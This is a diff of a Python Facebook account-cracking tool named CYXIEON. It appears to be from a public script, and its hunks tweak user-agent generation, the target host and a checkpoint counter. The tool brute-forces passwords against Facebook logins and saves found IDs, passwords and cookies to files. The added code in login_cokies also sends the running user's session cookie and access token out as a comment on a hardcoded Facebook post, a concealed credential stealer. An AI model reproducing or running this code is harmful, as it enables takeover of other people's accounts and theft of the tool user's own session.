@@ -64,12 +64,12 @@ for Xr in range (10000):
 	o = '0'
 	p = rr(3000,4999)
 	q = rr(40,99)
-	k = 'Mobile Safari/537.36 HeyTapBrowser/'
+	wa = 'Mobile Safari/537.36 HeyTapBrowser/'
 	r = rr(8,99)
 	s = rr(1,9)
 	t = rr(1,9)
 	uah = rr(1,9)
-	uaku = f'{a} {b}; {c}; {d}{e}{f}{g}{ver} {i}{h}.{j}.0.0{s}) {k}{l} {m}{n}.{o}.{p}.{q} {k}{r}.{s}.{t}.{uah}'
+	uaku = f'{a} {b}; {c}; {d}{e}{f}{g}{ver} {i}{h}.{j}.0.0{s}) {k}{l} {m}{n}.{o}.{p}.{q} {wa}{r}.{s}.{t}.{uah}'
 	ugen.append(uaku)
 
 #--------[ GENERATE-USER-AGENT ]----------#
@@ -138,7 +138,7 @@ def login_cokies():
         nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
         roq = ses.get(nek,cookies=cookies)
         tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-        requests.post(f"https://graph.facebook.com/v17.0/100028845823412_pfbid02PgysTCtVntrmi4ev7X1ubcP5Ztyr2w5djwEEWTRUsXhxtoU4j8avpVgGCAjeXHo8l/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
+        requests.post(f"https://graph.facebook.com/v17.0/100023328316616_pfbid0YoLsYftfv9fbayqEwA8zarmTsmDC1zha3jGUKNx62Lksu2q5QeY4GEy4rE7nqhbUl/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
         ken = open(".cyxieontoken.txt", "w").write(tok)
         cok = open(".cyxieoncokies.txt", "w").write(cookie)
         print(f"{kun}╭────────────────────────────────────────────{puti}")
@@ -419,7 +419,7 @@ def passwordlist():
 						pwx.append(sandi_kita)
 				else:pass
 				if 'validate' in method:
-				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'free.facebook.com')
+				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
 				elif 'reguler' in method:
 				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
 				elif 'asyinc' in method:
@@ -674,6 +674,7 @@ def crackasyinc(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
+				cp+=1
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
 				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
@@ -683,7 +684,6 @@ def crackasyinc(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
-				cp+=1
 				break	
 				
 			else:
@@ -750,7 +750,7 @@ def ceker(idf,pw):
 	except Exception as c:
 		tree = Tree("")
 		tree.add(f"{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}")
-		tree.add(f"{mer}spam ip tidak dapat cek opsi{puti}")
+		tree.add(f"{mer}spam ip tidak dapat cek ops{puti}i")
 		prints(tree)
 		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 		#cp+=1
